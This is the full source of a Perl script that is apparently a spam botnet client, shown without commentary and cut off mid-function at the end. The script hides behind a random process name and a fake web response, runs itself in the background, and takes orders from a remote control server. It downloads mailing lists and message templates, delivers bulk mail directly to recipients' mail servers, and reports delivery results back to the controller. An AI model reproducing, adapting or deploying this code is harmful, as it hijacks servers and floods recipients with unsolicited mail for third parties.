#!/usr/bin/perl
use strict; use IO::Socket; use IO::Select; my @fps = ("selix", "pims", "fixit"); my $nps = $fps[int rand scalar @fps]; $0 = $nps; $| = 1;
my $ewblock = 11; my $eiprogr = 150; if ($^O eq "linux") { $ewblock = 11; $eiprogr = 115; } if ($^O eq "freebsd") { $ewblock = 35; $eiprogr = 36; }
if ($^O eq "MSWin32") { $ewblock = 10035; $eiprogr = 10036; }
my $test = {
os => [$^O],
ip => ["0.0.0.0", "216.146.43.70", "77.88.55.60"],
tcp25 => [0, "67.195.229.58", "74.6.141.40", "104.47.34.33"],
udp53 => [0, "205.188.157.232", "64.12.51.132"],
tcp53 => [0, "205.188.157.232", "64.12.51.132"],
tcp80 => [0, "216.146.43.70", "77.88.55.60"]
}; &init(); $_ = 'Jm7'.'3uZ'; print "Content-type: text/plain; charset=iso-8859-1\x0D\x0A\x0D\x0A$_"; exit 0;
sub main
{
my $s_host = shift; my $s_port = shift; my $s_path = shift; my $s_nsex = shift;
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);
return if $child;
POSIX::setsid();
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD));
umask 0;
chdir "/";
open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT");
}
# &test();
# exit 0 if $test->{tcp25}[0] != 1;
# if ($test->{udp53}[0] != 1 && $test->{tcp53}[0] != 1) { exit 0 if !defined $s_nsex; $s_nsex = pack ("C4", split (/\./, $s_nsex)); } else { $s_nsex = undef; }
srand; my $pid = $$; $pid = 1 + int rand 2147483648 if !defined $pid || $pid !~ /^\d+$/ || $pid > 4294967295;
my $conf = {server_sign => 0x2000, client_sign => 0x1000, client_version => 12};
my $s = {version => $conf->{client_version}, command => 0, size => 0, timeout => 60, request => 1, host => pack ("C4", split (/\./, $s_host))};
my $b =
{
id		=> 0,
ip		=> "",
helo		=> undef,
timezone	=> [["+", "-"]->[int rand 2], (1 + int rand 6)],
nameserver	=> [],
timeout		=> 10,
session		=> 0,
copies		=> 1,
method		=> 0,
spf		=> 0,
level		=> 0,
mailbase	=> [],
from		=> [],
replyto		=> [],
subject		=> [],
header		=> "",
letter		=> "",
priority	=> 1,
type		=> 0,
charset		=> "",
good		=> [0, ""],
unlucky		=> [0, ""],
bad		=> [0, ""],
report		=> ""
};
my $readers = IO::Select->new() or exit 0;
my $writers = IO::Select->new() or exit 0;
my $session = {};
my $flagset = {timeout => 1};
my $cache = {};
my $reset_time = time;
my $reset_wait = 120;
my $reset_stat = 0;
my $first_exec = 1;
my $request_time = time;
my $request_flag = 1;
my $counter_addr = 0;
my $destroy = sub
{
my ($object, $handle) = @_;
if ($session->{$handle}{status} =~ /^rs/)
{
$request_flag = 1;
}
elsif (exists $session->{$handle}{object})
{
if ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Timeout\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
}
if (exists $session->{$handle}{mx})
{
$cache->{$session->{$handle}{mx}}[1] -- if $cache->{$session->{$handle}{mx}}[1] > 0;
}
delete $session->{$handle};
$object->remove($handle);
close $handle;
};
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $time = time;
if ($reset_stat != ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$reset_stat = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$reset_time = $time + $reset_wait;
}
if ($time >= $reset_time)
{
$reset_time = $time + $reset_wait;
$reset_stat = 0;
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
$session = {};
my $ha = [$writers->handles];
foreach my $hs (@$ha) { $writers->remove($hs); close $hs; }
$ha = [$readers->handles];
foreach my $hs (@$ha) { $readers->remove($hs); close $hs; }
$request_flag = 1;
$request_time = time;
next;
}
if ($request_flag && $time >= $request_time)
{
while (1)
{
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
last unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($s_port, $s->{host})))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
last;
}
}
unless ($writers->add($socket))
{
close $socket;
last;
}
$session->{$socket} =
{
status	=> "rs_cn",
buffer	=> "",
flagset	=> $flagset->{timeout},
timeout	=> 0
};
$s->{$_} = 0 for (qw (command size));
if ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]))
{
$s->{command} = 1;
$s->{command} = 2 if $first_exec;
$reset_time = $time + $reset_wait;
$reset_stat = 0;
if ($counter_addr)
{
$s->{size} = 16;
$session->{$socket}{buffer} .= pack ("L", $b->{id});
$session->{$socket}{buffer} .= pack ("L", $b->{$_}[0]) for (qw (good unlucky bad));
if ($b->{level})
{
for (qw (good unlucky bad))
{
$s->{size} += (4 + length $b->{$_}[1]);
$session->{$socket}{buffer} .= pack ("L", length $b->{$_}[1]);
$session->{$socket}{buffer} .= $b->{$_}[1];
}
if ($b->{level} > 1)
{
$s->{size} += (4 + length $b->{report});
$session->{$socket}{buffer} .= pack ("L", length $b->{report});
$session->{$socket}{buffer} .= $b->{report};
}
}
}
}
$session->{$socket}{buffer} = pack ("SC2L2", $conf->{client_sign}, $s->{version}, $s->{command}, $pid, $s->{size}) . $session->{$socket}{buffer};
$s->{size} = length $session->{$socket}{buffer};
$session->{$socket}{buffer} = "EHLO localhost\x0D\x0A$session->{$socket}{buffer}";
$request_flag = 0;
last;
}
}
if (my $mail_array = shift @{$b->{mailbase}})
{
while (scalar @$mail_array)
{
my $mail = @{$mail_array}[0];
my ($mx) = &mail(\$mail);
$mx = lc ((split /\@/, $$mx)[1]);
my $type = 15;
if (exists $cache->{$mx})
{
my $sv = $mx;
$mx = $cache->{$sv}[0];
if ($mx =~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/)
{
$cache->{$sv}[1] = 0 unless $cache->{$sv}[1];
if ($b->{session} && ($cache->{$sv}[1] >= $b->{session}))
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255)
{
while ($_ = shift @$mail_array)
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [mx_ip] Object non exists\x0A" if $b->{level} > 1;
}
}
last;
}
$mx = pack ("C4", $1, $2, $3, $4);
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in(25, $mx)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [mx_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;
push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
last;
}
}
unless ($writers->add($socket))
{
close $socket;
push @{$b->{mailbase}}, $mail_array;
last;
}
$cache->{$sv}[1] ++;
my $sender = @{$b->{from}}[int rand scalar @{$b->{from}}];
$sender =~ s/\@.+$/\@$b->{helo}/ if ($b->{spf} && $b->{helo} ne "localhost");
$session->{$socket} =
{
status	=> "mx_cn",
mx		=> $sv,
buffer	=> "",
object	=> $mail_array,
mindex	=> 0,
sender	=> $sender,
flagset	=> $flagset->{timeout},
timeout	=> 0
};
last;
}
else
{
$type = 1;
}
}
else
{
$type = 15;
}
my $socket;
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto => "udp");
}
else
{
$socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
}
unless ($socket)
{
push @{$b->{mailbase}}, $mail_array;
last;
}
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($test->{udp53}[0] == 0)
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
if (defined $s_nsex) { $nameserver = sockaddr_in(25, $s_nsex);
} else { $nameserver = sockaddr_in(53, $nameserver); 
}
unless ($socket->connect($nameserver))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$mail\x0A";
$b->{report} .= "$mail - [ns_cn] Can't connect\x0A" if $b->{level} > 1;
}
shift @$mail_array;
push @{$b->{mailbase}}, $mail_array if scalar @$mail_array;
last;
}
}
}
unless ($writers->add($socket))
{
close $socket;
push @{$b->{mailbase}}, $mail_array;
last;
}
$session->{$socket} =
{
status	=> "ns_wr",
buffer	=> "",
object	=> $mail_array,
sender	=> 0,
flagset	=> $flagset->{timeout},
timeout	=> 0,
type	=> $type,
packet	=> int rand 65536,
size	=> 0
};
$session->{$socket}{buffer} .= pack ("nSn4", $session->{$socket}{packet}, 1, 1, 0, 0, 0);
$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $mx));
$session->{$socket}{buffer} .= pack ("Cn2", 0, $session->{$socket}{type}, 1);
$session->{$socket}{sender} = length $session->{$socket}{buffer};
if ($test->{udp53}[0] == 0)
{
$session->{$socket}{status} = "ns_cn";
$session->{$socket}{buffer} = join ("", pack ("n", $session->{$socket}{sender}), $session->{$socket}{buffer});
}
last;
}
}
elsif ($counter_addr && !scalar keys %$session)
{
$counter_addr = ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]) if $counter_addr > ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
$request_time = $time if $counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0]);
}
my $writable = [$writers->handles];
foreach my $handle (@$writable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($writers, $handle);
}
}
$writable = (IO::Select->select(undef, $writers, undef, 0))[1];
foreach my $handle (@$writable)
{
if ($session->{$handle}{status} =~ /cn$/)
{
if ($handle->connected)
{
if ($session->{$handle}{status} eq "rs_cn")
{
$session->{$handle}{status} = "rs_wr";
}
elsif ($session->{$handle}{status} eq "ns_cn")
{
$session->{$handle}{status} = "ns_wr";
}
else
{
$session->{$handle}{status} = "mx_rd";
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
else
{
$destroy->($writers, $handle);
}
}
else
{
my $result;
if ($session->{$handle}{status} eq "ns_wr")
{
if ($test->{udp53}[0] == 0)
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
my $nameserver = shift @{$b->{nameserver}}; push @{$b->{nameserver}}, $nameserver;
$result = $handle->send($session->{$handle}{buffer}, 0, $_ = sockaddr_in(53, $nameserver));
}
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
if ($session->{$handle}{status} eq "rs_wr")
{
$session->{$handle}{status} = "rs_rd";
if ($s->{command} && $counter_addr && ($counter_addr <= ($b->{good}[0] + $b->{unlucky}[0] + $b->{bad}[0])))
{
$counter_addr = 0;
$b->{$_} = [] for (qw (mailbase from replyto subject));
$b->{$_} = [0, ""] for (qw (good unlucky bad));
$b->{report} = "";
$cache = {};
}
$request_time = $time + $s->{request} * 60;
}
elsif ($session->{$handle}{status} eq "ns_wr")
{
$session->{$handle}{status} = "ns_rd";
}
unless ($readers->add($handle))
{
$destroy->($writers, $handle);
next;
}
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($writers, $handle);
}
}
}
my $readable = [$readers->handles];
foreach my $handle (@$readable)
{
if ($session->{$handle}{flagset} & $flagset->{timeout})
{
if ($session->{$handle}{status} =~ /^rs/)
{
$session->{$handle}{timeout} = $time + $s->{timeout};
}
else
{
$session->{$handle}{timeout} = $time + $b->{timeout};
}
$session->{$handle}{flagset} ^= $flagset->{timeout};
}
elsif ($time >= $session->{$handle}{timeout})
{
$destroy->($readers, $handle);
}
}
$readable = (IO::Select->select($readers, undef, undef, 0))[0];
foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{status} eq "ns_rd")
{
if ($test->{udp53}[0] == 0)
{
my $tempbuffer = "";
if ($session->{$handle}{size} == 0)
{
$handle->recv($tempbuffer, (2 - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if (2 == length $session->{$handle}{buffer})
{
$session->{$handle}{size} = unpack ("n", $session->{$handle}{buffer});
$session->{$handle}{buffer} = "";
}
next;
}
$handle->recv($tempbuffer, ($session->{$handle}{size} - length $session->{$handle}{buffer}));
$session->{$handle}{buffer} .= $tempbuffer;
if ($session->{$handle}{size} == length $session->{$handle}{buffer})
{
$result = $session->{$handle}{size};
}
}
else
{
$result = $handle->recv($session->{$handle}{buffer}, 512);
$result = length $session->{$handle}{buffer} if defined $result;
}
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 16384, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($result > 0)
{
if ($session->{$handle}{status} eq "rs_rd")
{
next if 8 > length $session->{$handle}{buffer};
if ($session->{$handle}{buffer} !~ /^220 OK/)
{
$destroy->($readers, $handle);
next;
}
else
{
my $offset = index ($session->{$handle}{buffer}, "\x0D\x0A");
next unless $offset >= 0;
if ($session->{$handle}{buffer} =~ /^(220) OK\x0D\x0A/)
{
if ($1 !~ /^220/)
{
$destroy->($readers, $handle);
next;
}
$offset += 2;
next if 10 > (length $session->{$handle}{buffer}) - $offset;
my $server =
{
sign		=> 0,
timeout		=> 0,
request		=> 0,
command		=> 0,
size		=> 0
};
@_ = unpack ("S2C2L", substr ($session->{$handle}{buffer}, $offset, 10));
$server->{$_} = shift @_ for (qw (sign timeout request command size));
if ($server->{sign} != $conf->{server_sign})
{
$destroy->($readers, $handle);
next;
}
$first_exec = 0;
exit 0 if $server->{command};
$s->{timeout} = $server->{timeout};
$s->{request} = $server->{request};
$request_time = $time + $s->{request} * 60;
unless ($server->{size})
{
$destroy->($readers, $handle);
next;
}
$offset += 10;
next if $server->{size} > (length $session->{$handle}{buffer}) - $offset;
substr ($session->{$handle}{buffer}, 0, $offset) = "";
@_ = unpack ("La4", substr ($session->{$handle}{buffer}, 0, 8, ""));
$b->{$_} = shift @_ for (qw (id ip));
$b->{nameserver} = [];
push @{$b->{nameserver}}, substr ($session->{$handle}{buffer}, 0, 4, "") for (1..16);
@_ = unpack ("S2C4", substr ($session->{$handle}{buffer}, 0, 8, ""));
$b->{$_} = shift @_ for (qw (timeout session copies method spf level));
@{$b->{$_}} = split ("\x0A", substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "")) for (qw (mailbase from replyto subject));
$counter_addr = scalar @{$b->{mailbase}};
my $mailbase_temp = {};
while (my $mail_temp = shift @{$b->{mailbase}})
{
my ($host_temp) = &mail(\$mail_temp);
$host_temp = lc ((split /\@/, $$host_temp)[1]);
$mailbase_temp->{$host_temp} = [] unless exists $mailbase_temp->{$host_temp};
push @{$mailbase_temp->{$host_temp}}, $mail_temp;
}
foreach my $host_temp (keys %$mailbase_temp)
{
while (scalar @{$mailbase_temp->{$host_temp}})
{
my $mail_temp = [];
for (1..$b->{copies})
{
last unless scalar @{$mailbase_temp->{$host_temp}};
push @$mail_temp, shift @{$mailbase_temp->{$host_temp}};
}
push @{$b->{mailbase}}, $mail_temp;
}
}
undef $mailbase_temp;
$b->{header} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
unless ($b->{header})
{
$b->{header} = ['Date: %DATE%', 'From: %FROMADDR%', 'Reply-To: %REPLYTOADDR%', 'X-Priority: %NPRIORITY%', 'Message-ID: <%MESSAGEID%@%HELO%>', 'To: %TOADDR%', 'Subject: %SUBJECT%'];
$b->{header} = join ("\x0D\x0A", @{$b->{header}}, 'MIME-Version: 1.0', 'Content-Type: text/%TYPE%; charset=%CHARSET%', 'Content-Transfer-Encoding: %ENCODING%');
}
$b->{letter} = substr ($session->{$handle}{buffer}, 0, unpack ("L", substr ($session->{$handle}{buffer}, 0, 4, "")), "");
$b->{letter} = "" unless $b->{letter};
$b->{$_} = unpack ("C", substr ($session->{$handle}{buffer}, 0, 1, "")) for (qw (priority type));
$b->{charset} = substr ($session->{$handle}{buffer}, 0, length $session->{$handle}{buffer}, "");
$b->{ip} = join (".", unpack ("C4", $b->{ip}));
unless ($b->{helo})
{
if (defined $s_nsex)
{
$b->{helo} = &nsptr($_ = sockaddr_in(25, $s_nsex), 3, $b->{ip});
}
else
{
$b->{helo} = &nsptr($_ = sockaddr_in(53, $b->{nameserver}[0]), 3, $b->{ip});
$b->{helo} = &nsptr($_ = sockaddr_in(53, pack ("C4", split (/\./, "8.8.8.8"))), 3, $b->{ip}) unless $b->{helo};
}
$b->{helo} = "localhost" unless $b->{helo};
}
$b->{report} = "\x0ACLIENT V.$s->{version} IP=$b->{ip} PTR=$b->{helo} ID=$b->{id}\x0A\x0A" if $b->{level} > 1;
$destroy->($readers, $handle);
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
elsif ($session->{$handle}{status} eq "ns_rd")
{
if (length $session->{$handle}{buffer})
{
my ($resp, $code) = &nsparser(\$session->{$handle}{buffer}, $session->{$handle}{sender}, $session->{$handle}{packet}, $session->{$handle}{type});
if ($resp == 2)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$_\x0A";
$b->{report} .= "$_ - [ns_rd] $code\x0A" if $b->{level} > 1;
}
}
}
elsif ($resp == 1)
{
$resp = shift @{$session->{$handle}{object}};
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$resp\x0A";
$b->{report} .= "$resp - [ns_rd] $code\x0A" if $b->{level} > 1;
}
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
}
else
{
$resp = @{$session->{$handle}{object}}[0];
($resp) = &mail(\$resp);
$resp = lc ((split /\@/, $$resp)[1]);
$cache->{$resp}[0] = $code;
push @{$b->{mailbase}}, $session->{$handle}{object};
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
elsif ($session->{$handle}{buffer} =~ /^[^\-]{4}.*\x0D\x0A$/m)
{
if ($session->{$handle}{buffer} !~ /^(2|3)/)
{
if ($b->{level} > 1)
{
$session->{$handle}{buffer} =~ s/\x0D//g;
$session->{$handle}{buffer} =~ s/[\x09|\x0A]+/\x20/g;
}
$session->{$handle}{mindex} -- if $session->{$handle}{mindex} > 0;
if ($session->{$handle}{status} =~ /^mx_(rd|gr)$/)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
elsif ($session->{$handle}{status} =~ /^mx_(mf|rt)$/)
{
if ($session->{$handle}{buffer} =~ /\d+\.\d+\.\d+\.\d+/g || $session->{$handle}{buffer} =~ /( ip |block|black|reject|later|many)/ig)
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$_\x0A";
$b->{report} .= "$_ - [$session->{$handle}{status}] Bad host $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
}
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
else
{
$b->{bad}[0] ++;
if ($b->{level})
{
$b->{bad}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Invalid recipient $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
unless (scalar @{$session->{$handle}{object}})
{
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
}
else
{
$b->{unlucky}[0] ++;
if ($b->{level})
{
$b->{unlucky}[1] .= "$session->{$handle}{object}[$session->{$handle}{mindex}]\x0A";
$b->{report} .= "$session->{$handle}{object}[$session->{$handle}{mindex}] - [$session->{$handle}{status}] Delivery error $session->{$handle}{buffer}\x0A" if $b->{level} > 1;
}
splice @{$session->{$handle}{object}}, $session->{$handle}{mindex}, 1;
push @{$b->{mailbase}}, $session->{$handle}{object} if scalar @{$session->{$handle}{object}};
delete $session->{$handle}{object};
$destroy->($readers, $handle);
next;
}
}
if ($session->{$handle}{status} eq "mx_rd")
{
my $helo = $b->{helo};
$session->{$handle}{buffer} = "E"."H";
$session->{$handle}{buffer} .= "L"."O"." $helo\x0D\x0A";
$session->{$handle}{status} = "mx_gr";
}
elsif ($session->{$handle}{status} eq "mx_gr")
{
my ($mail) = &mail(\$session->{$handle}{sender});
$session->{$handle}{buffer} = "MAIL ";
$session->{$handle}{buffer} .= "FROM: <$$mail>\x0D\x0A";
$session->{$handle}{status} = "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_mf")
{
my ($mail) = &mail(\$session->{$handle}{object}[$session->{$handle}{mindex}]);
$session->{$handle}{buffer} = "RCPT TO: <$$mail>\x0D\x0A";
$session->{$handle}{mindex} ++;
$session->{$handle}{status} = $session->{$handle}{mindex} >= scalar @{$session->{$handle}{object}} ? "mx_rt" : "mx_mf";
}
elsif ($session->{$handle}{status} eq "mx_rt")
{
$session->{$handle}{buffer} = "DATA\x0D\x0A";
$session->{$handle}{status} = "mx_dt";
}
elsif ($session->{$handle}{status} eq "mx_dt")
{
$session->{$handle}{buffer} = &data($session->{$handle}{object}, $session->{$handle}{sender}, $b);
$session->{$handle}{buffer} .= "\x0D\x0A.\x0D\x0A";
$session->{$handle}{status} = "mx_dr";
}
elsif ($session->{$handle}{status} eq "mx_dr")
{
$b->{good}[0] += scalar @{$session->{$handle}{object}};
if ($b->{level})
{
while ($_ = shift @{$session->{$handle}{object}})
{
$b->{good}[1] .= "$_\x0A";
}
}
delete $session->{$handle}{object};
$session->{$handle}{buffer} = "QUIT\x0D\x0A";
$session->{$handle}{status} = "mx_qt";
}
else
{
$destroy->($readers, $handle);
next;
}
unless ($writers->add($handle))
{
$destroy->($readers, $handle);
next;
}
$readers->remove($handle);
}
}
else
{
$destroy->($readers, $handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($readers, $handle);
next;
}
}
}
}
sub nsunpack
{
my ($packet, $offset) = @_;
my ($length, $size, $name, $next) = (length $$packet, 0, "", "");
while (1)
{
return if $length < ($offset + 1);
$size = unpack ("\@$offset C", $$packet);
if ($size == 0)
{
$offset ++;
last;
}
elsif (($size & 192) == 192)
{
return if $length < ($offset + 2);
$next = unpack ("\@$offset n", $$packet);
$next &= 16383;
($next) = &nsunpack($packet, $next);
return if !defined $next;
$name .= $next;
$offset += 2;
last;
}
else
{
$offset ++;
return if $length < ($offset + $size);
$next = substr ($$packet, $offset, $size);
$name .= "$next.";
$offset += $size;
}
}
$name =~ s/\.$//;
return if !length $name;
return ($name, $offset);
}
sub nsrecord
{
my ($packet, $offset) = @_;
my ($length, $name) = (length $$packet, "");
($name, $offset) = &nsunpack($packet, $offset);
return if !defined $name || $length < ($offset + 10);
my ($rtype, $rclass, $rttl, $rlength) = unpack ("\@$offset n2Nn", $$packet);
$offset += 10;
return if $length < ($offset + $rlength);
return ($name, $offset, $rtype, $rclass, $rttl, $rlength);
}
sub nsparser
{
my ($packet, $offset, $sequence, $type) = @_;
my ($length, $name) = (length $$packet, "");
return (1, "Broken header") if $length < 12;
@_ = unpack ("nC2n4", $$packet);
my $header =
{
id		=> $_[0],
qr		=> ($_[1] >> 7) & 1,
opcode	        => ($_[1] >> 3) & 15,
aa		=> ($_[1] >> 2) & 1,
tc		=> ($_[1] >> 1) & 1,
rd		=> $_[1] & 1,
ra		=> ($_[2] >> 7) & 1,
z		=> ($_[2] >> 4) & 6,
rcode	        => $_[2] & 15,
qdcount	        => $_[3],
ancount	        => $_[4],
nscount   	=> $_[5],
arcount	        => $_[6]
};
return (1, "Synchronization error") if $header->{id} != $sequence;
return (1, "Recursion disabled") if !$header->{ra};
return (2, "Query format error") if $header->{rcode} == 1;
return (2, "Server failure") if $header->{rcode} == 2;
return (2, "Non-existent domain") if $header->{rcode} == 3;
return (2, "Empty answer section") if !$header->{ancount};
return (1, "Broken packet") if $length < $offset;
my ($answer, $rtype, $rclass, $rttl, $rlength) = ({}, 0, 0, 0, 0);
while ($header->{ancount})
{
$header->{ancount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($type != $rtype)
{
$offset += $rlength;
next;
}
if ($type == 1)
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$offset += $rlength;
$name = inet_ntoa($name);
$answer->{$name} = 1;
}
elsif ($type == 12)
{
($name, $offset) = &nsunpack($packet, $offset);
last if !defined $name;
$answer->{$name} = 1;
}
elsif ($type == 15)
{
$sequence = substr ($$packet, $offset, 2);
last if !defined $sequence || 2 > length $sequence;
($name, $offset) = &nsunpack($packet, ($offset + 2));
last if !defined $name;
$answer->{$name} = unpack ("n", $sequence);
}
}
return (2, "No resourse records") if !scalar keys %$answer;
my $result = (sort {$answer->{$a} <=> $answer->{$b}} keys %$answer)[0];
if ($type == 15 && $header->{arcount})
{
while ($header->{nscount})
{
$header->{nscount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
$offset += $rlength;
}
while ($header->{arcount})
{
$header->{arcount} --;
($name, $offset, $rtype, $rclass, $rttl, $rlength) = &nsrecord($packet, $offset);
last if !defined $name;
if ($rtype == 1 && exists $answer->{$name})
{
$name = substr ($$packet, $offset, 4);
last if !defined $name || 4 > length $name;
$result = inet_ntoa($name);
last;
}
$offset += $rlength;
}
}
return (0, $result);
}
sub nsptr
{
my ($packaddr, $timeout, $query) = @_; my $type = 12;
return if !defined $query || $query !~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/;
return if ($1 > 255 || $2 > 255 || $3 > 255 || $4 > 255);
$query = "$4.$3.$2.$1.in-addr.arpa";
my $packid = int rand 65536; my $packet = pack ("nSn4", $packid, 1, 1, 0, 0, 0);
$packet .= pack ("C", length $_) . $_ for (split (/\./, lc $query));
$packet .= pack ("Cn2", 0, $type, 1);
my $offset = length $packet;
my ($socket, $select, $buffer, $resp, $text, $size);
if ($test->{udp53}[0] == 1)
{
$socket = IO::Socket::INET->new(Proto=>"udp");
return unless $socket;
$select = new IO::Select $socket;
if ($select->can_write($timeout))
{
unless ($socket->send($packet, 0, $packaddr))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$socket->recv($buffer, 512);
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
else
{
$socket = IO::Socket::INET->new(Proto=>"tcp", Type=>SOCK_STREAM);
return unless $socket;
$select = new IO::Select $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($packaddr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
return;
}
unless ($select->can_write($timeout))
{
close $socket;
return;
}
unless ($socket->connected)
{
close $socket;
return;
}
}
$socket->blocking(1);
$packet = pack ("n", length $packet) . $packet;
if ($select->can_write($timeout))
{
unless ($socket->send($packet))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$buffer = ""; $text = 2;
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
if (!length $buffer)
{
close $socket;
return;
}
unless ($text = unpack ("n", $buffer))
{
close $socket;
return;
}
unless ($select->can_read($timeout))
{
close $socket;
return;
}
$buffer = "";
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
unless ($text == length $buffer)
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
($resp, $text) = &nsparser(\$buffer, $offset, $packid, $type);
return !$resp ? $text : undef;
}
sub mail
{
my $line = shift;
return if !defined $$line || $$line !~ /^[^\@]+\@[^\@]+\.[^\@]+$/;
my ($name, $mail, $info) = $$line =~ /\s*(.*?)[\s\|<]*([^\s|<]+\@[^>\|\s]+)>*(.*)$/;
return if !$mail;
